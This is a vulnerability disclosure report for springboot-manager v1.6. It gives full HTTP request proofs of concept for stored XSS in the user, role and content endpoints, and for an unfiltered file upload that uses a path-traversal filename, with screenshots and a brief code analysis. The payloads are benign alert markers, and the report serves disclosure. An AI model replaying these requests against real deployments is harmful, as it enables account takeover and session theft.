# Project

Address: [springboot-manager](https://github.com/aitangbao/springboot-manager)

# 1. Stored cross-site scripting

## 1.1 Stored cross-site scripting `/sys/user`

[Suggested description]

There is a risk at interface: `/sys/user` that code execution is triggered when a user accesses the page. This kind of XSS is more dangerous, easy to cause worms, cookie theft, etc.

[Vendor of Product]

https://github.com/aitangbao/springboot-manager/releases/tag/v1.6

[Affected Product Code Base]

v1.6

[Affected Component]

/sys/user

POC

Enter the XSS code: 
```
PUT /sys/user HTTP/1.1
Host: 192.168.0.100:8080
Content-Length: 195
authorization: A96L7u9MTzBj87Je0HWHe77m9v4T3602#fcf34b56-a7a2-4719-9236-867495e74c31
Content-Type: application/json; charset=UTF-8
Connection: close

{"id":"1745973977530089473","deptId":"4bd0b0a3-097d-4902-a1f7-641ea3b771bd","username":"test<script>alert(1)</script>","password":"123456","phone":"15515512345","deptName":"部门1","status":"1"}
```

Trigger vulnerability: 
```
POST /sys/users HTTP/1.1
Host: 192.168.0.100:8080
Content-Length: 2
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
authorization: A96L7u9MTzBj87Je0HWHe77m9v4T3602#fcf34b56-a7a2-4719-9236-867495e74c31
Content-Type: application/json
Connection: close

{}
```

[Vulnerability recurrence]

The vulnerability trigger point is in User Management, the vulnerability parameter is `username`:

![1705111803448](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/91934fff-18d2-45c2-8f26-647cf8dd81e4)

Trigger vulnerability

![1705111950693](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/75a3cbc5-29a4-4c11-9a6c-686dd600422b)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/c4030e11-5fd3-4b0d-8241-8ca0e8f9df45)

### 1.2 Stored cross-site scripting `/sys/role`

[Suggested description]

There is a risk at interface: `/sys/role` that code execution is triggered when a user accesses the page. This kind of XSS is more dangerous, easy to cause worms, cookie theft, etc.

[Vendor of Product]

https://github.com/aitangbao/springboot-manager/releases/tag/v1.6

[Affected Product Code Base]

v1.6

[Affected Component]

/sys/role

POC

Enter the XSS code: 
```
PUT /sys/role HTTP/1.1
Host: 192.168.0.100:8080
Content-Length: 135
authorization: 3o0z3ix86240O63M5e4U3zHK5p7Ew4HF#fcf34b56-a7a2-4719-9236-867495e74c31
Content-Type: application/json; charset=UTF-8
Connection: close

{"id":"1745993356841861121","name":"<script>alert(1)</script>","description":"<script>alert(2)</script>","status":"1","permissions":[]}
```

Trigger vulnerability: 
```
POST /sys/roles HTTP/1.1
Host: 192.168.0.100:8080
Content-Length: 2
authorization: 3o0z3ix86240O63M5e4U3zHK5p7Ew4HF#fcf34b56-a7a2-4719-9236-867495e74c31
Content-Type: application/json
Connection: close

{}
```

[Vulnerability recurrence]

The vulnerability trigger is in Role Management, the vulnerability parameter is `name` and `description`:

![1705112783159](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/50bce4c7-53f2-43be-adb6-917174fbfeb8)

Trigger vulnerability

![1705112894082](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/384c80e2-7eb9-4e61-a95e-e9877a46dcb4)

![1705112804982](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/bab88a6f-0010-4d0b-a1bf-3587dbc22407)

![1705112810735](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/07df8448-1dec-4ea2-8df4-734df85b9b70)

### 1.3 Stored cross-site scripting `/sysContent/add`

[Suggested description]

There is a risk at interface: `/sysContent/add` that code execution is triggered when a user accesses the page. This kind of XSS is more dangerous, easy to cause worms, cookie theft, etc.

[Vendor of Product]

https://github.com/aitangbao/springboot-manager/releases/tag/v1.6

[Affected Product Code Base]

v1.6

[Affected Component]

/sysContent/add

POC

Enter the XSS code: 
```
POST /sysContent/add HTTP/1.1
Host: 192.168.0.100:8080
Content-Length: 104
authorization: A96L7u9MTzBj87Je0HWHe77m9v4T3602#fcf34b56-a7a2-4719-9236-867495e74c31
Content-Type: application/json; charset=UTF-8
Connection: close

{"id":"","title":"<script>alert(1)</script>","type":"0","content":"<script>alert(2)</script>","file":""}
```

Trigger vulnerability: 
```
POST /sysContent/listByPage HTTP/1.1
Host: 192.168.0.100:8080
Content-Length: 2
authorization: 3o0z3ix86240O63M5e4U3zHK5p7Ew4HF#fcf34b56-a7a2-4719-9236-867495e74c31
Content-Type: application/json
Connection: close

{}
```

[Vulnerability recurrence]

The vulnerability trigger is in Role Management, the vulnerability parameter is `title` and `content`:

![1705113681656](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/979b7ab9-da98-4a8c-a484-e3a1258e95de)

![1705113800478](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/41de4348-271a-4232-aa01-2ffae90509ae)

Trigger vulnerability

![a9115525ea4f1e40ea2618d664f7462](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/33587246-b2a8-4320-b3a0-053a50186d65)

![1705113750847](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/0150893f-1170-4c44-82e7-ea793ab738a5)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/8bac8fc6-bfeb-4dba-ac66-be84421bccbd)


# 2. File upload vulnerability

[Suggested description]

The system does not filter the suffixes of uploaded files. As a result, malicious xss files can be uploaded, triggering storage XSS vulnerabilities.

[Vendor of Product]

https://github.com/aitangbao/springboot-manager/releases/tag/v1.6

[Affected Product Code Base]

v1.6

[Affected Component]

/sysFiles/upload

POC

```
POST /sysFiles/upload?authorization=A96L7u9MTzBj87Je0HWHe77m9v4T3602%23fcf34b56-a7a2-4719-9236-867495e74c31 HTTP/1.1
Host: 192.168.0.100:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysToz7xWVQvklKbQC
Connection: close
Content-Length: 214

------WebKitFormBoundarysToz7xWVQvklKbQC
Content-Disposition: form-data; name="file"; filename="../../test.html"
Content-Type: image/jpeg

<script>alert(1)</script>
------WebKitFormBoundarysToz7xWVQvklKbQC--
```

[Vulnerability recurrence]

The trigger point of the vulnerability is "File Management" --> "Upload File"

![1705118847824](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/4911452b-54ef-49eb-a6e8-2f971f4082d6)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/9da7d815-c8c6-482e-8ee1-daafd3bf3135)

![1705118929996](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/a1a4075c-3113-406b-bad7-9c71f2dc6081)

[Code analysis]

Call the function `sysFilesService.saveFile()` to do this

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/7da2bfa5-8114-4499-b6f6-5fdc9aa3be5a)

Call `getFileType()` to get the file suffix

![1705119331565](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/155d3f72-ec40-493a-966f-22ea6a9059f6)

The suffix is obtained without any processing, and is simply spliced directly

![1705119406946](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/f064de1e-7dbf-4d60-8deb-6307a50b9f38)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/00dd4a45-68f5-46a3-ad06-0df5996ae66f)
